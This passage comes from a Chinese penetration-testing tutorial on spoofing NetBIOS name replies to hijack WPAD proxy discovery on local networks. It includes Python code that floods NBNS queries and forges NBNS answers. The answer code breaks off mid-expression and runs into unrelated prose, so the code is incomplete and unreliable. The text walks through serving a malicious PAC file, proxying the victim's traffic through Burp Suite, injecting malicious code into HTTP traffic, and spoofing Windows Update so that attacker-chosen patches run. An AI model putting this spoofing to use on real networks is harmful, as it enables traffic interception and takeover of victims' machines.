NetBIOS 协议的内容比较多，其中有不少与我们在内网渗透中所使用的一些命令有直接的关系，更多内容可以查阅 NetBIOS 协议的[ RFC
文档](https://tools.ietf.org/html/rfc1002)
#### Python 实现 NetBIOS 协议的质询与应答
尽管目前已有相当优秀的网络协议开源库实现了 NetBIOS 的质询与应答，不过为了更好的理解 NetBIOS 协议，我们还是动手自己来构造协议数据包。根据
Wireshark 抓取的数据包（图 5）可以很快的构造并实现 NetBIOS 协议的名称查询数据包。代码如下：  
​
    #/usr/bin/env python
    # -*- coding:utf-8 -*-    
    __doc__ = """
        NBNS Query ,
                        by Her0in
    """
    import socket, struct
    class NBNS_Query:
        def __init__(self,name):
            self.name = name
            self.populate()
        def populate(self):
            self.HOST = '192.168.16.255'
            self.PORT = 137
            self.nqs = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.QueryData = (
            "\xa9\xfb"  # Transaction ID
            "\x01\x10"  # Flags Query
            "\x00\x01"  # Question:1
            "\x00\x00"  # Answer RRS
            "\x00\x00"  # Authority RRS
            "\x00\x00"  # Additional RRS
            "\x20"      # length of Name:32
            "NAME"      # Name   
            "\x00"      # NameNull
            "\x00\x20"  # Query Type:NB
            "\x00\x01") # Class
            self.data = self.QueryData.replace('NAME', struct.pack("32s", self.encode_name(self.name)))
        # From http://code.google.com/p/dpkt/
        def encode_name(self,name):
            """Return the NetBIOS first-level encoded name."""
            l = []
            for c in struct.pack('16s', name):
                c = ord(c)
                l.append(chr((c >> 4) + 0x41))
                l.append(chr((c & 0xf) + 0x41))
            return ''.join(l)
        def Query(self):
            while 1:
                print "NBNS Querying... -> %s" % self.name
                self.nqs.sendto(self.data, (self.HOST, self.PORT))
            self.nqs.close()
    if __name__ == "__main__":
        nbns = NBNS_Query("WPAD")
        nbns.Query()
通过 Wireshark 抓取 NetBIOS **名称查询** 的应答数据包，同样可以快速实现名称查询的应答功能。代码如下：
    #/usr/bin/env python
    # -*- coding:utf-8 -*-    __doc__ = """
        NBNS Answer ,
                        by Her0in
    """
    import socket, struct,binascii
    class NBNS_Answer:
        def __init__(self, addr):
            self.IPADDR  = addr
            self.nas = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.init_socket()
            self.populate()
        def populate(self):
            self.AnswerData = (
            "TID"              # Transaction ID
            "\x85\x00"         # Flags Query
            "\x00\x00"         # Question
            "\x00\x01"         # Answer RRS
            "\x00\x00"         # Authority RRS
            "\x00\x00"         # Additional RRS
            "\x20"             # length of Name:32
            "NAME"             # Name   
            "\x00"             # NameNull
            "\x00\x20"         # Query Type:NB
            "\x00\x01"         # Class
            "\x00\x00\x00\xa5" # TTL
            "\x00\x06"         #
            "\x00\x00"         # Null
            "IPADDR")          # IP Address
        def init_socket(self):
            self.HOST = "0.0.0.0"
            self.PORT = 137
            self.nas.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.nas.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
        def decode_name(self, nbname):
            """Return the NetBIOS first-level decoded nbname."""
            if len(nbname) != 32:
                return nbname
            l = []
            for i in range(0, 32, 2):
                l.append(chr(((ord(nbname[i]) - 0x41)  Burp Suite）。  
受害者主机（Windows XP） 打开 IE 浏览器（已启用了 WPAD 功能）开始上网，此时浏览器就会寻找当前局域网中的代理服务器，实际上是进行了
WPAD 的名称查询，可以从图中看到攻击者的恶意应答程序做了恶意应答，同时提供 PAC 配置文件下载的 HTTP
服务器打印出了日志信息，此时受害者的浏览器已经下载了 PAC
配置文件（该文件内容为代理服务器地址信息），之后，受害者的浏览器就会使用攻击者指定的代理服务器进行上网，这一点从 Burp Suite 中就可以看到。  
OK，上述内容就是整个攻击的思路和流程，在实战中，完全可以将攻击过程程序化，自动化。
## 0x05 总结
利用 NetBIOS 协议进行中间人攻击的方式其实还有很多，攻击的思路也可以很灵活的根据实际需要进行布局。在利用 WPAD
进行攻击时，实际的效果很有可能没有想象的那么好，不过一旦奏效，就可以拿到受害者主机权限。尤其是在无计可施的情况下，还是值得一试的，很多内网中，管理员都不会对这些攻击方式做防御措施，除了部分桌面安全产品，如防火墙可能会做严格的过滤拦截，大部分情况下，此类攻击方式还是很有效的，尤其是可以在做名称解析响应时，筛选受害者主机，对
HTTP 数据包进行更改插入恶意代码，进行针对性的定点打击。另外，NetBIOS 协议比起 LLMNR 有一个更佳有利于攻击的特点，NetBIOS
协议的名称解析可以对受害者访问的域名进行响应，当然，前提是 DNS 服务器没有做出成功的响应时，才会使用 NetBIOS 协议进行查询。关于这一点以及
WPAD ，都可以结合 Windows Update 所使用的更新域名进行中间人攻击，下载并执行攻击者指定的补丁文件。
关于 NetBIOS 协议的内容可以在相关的 RFC 文档中查阅，其中还有不少东西可以在内网渗透中利用到，如 OPCODE 字段的取值，BROWSER
协议等等，更多的攻击思路还有待各位看官多多“引玉”。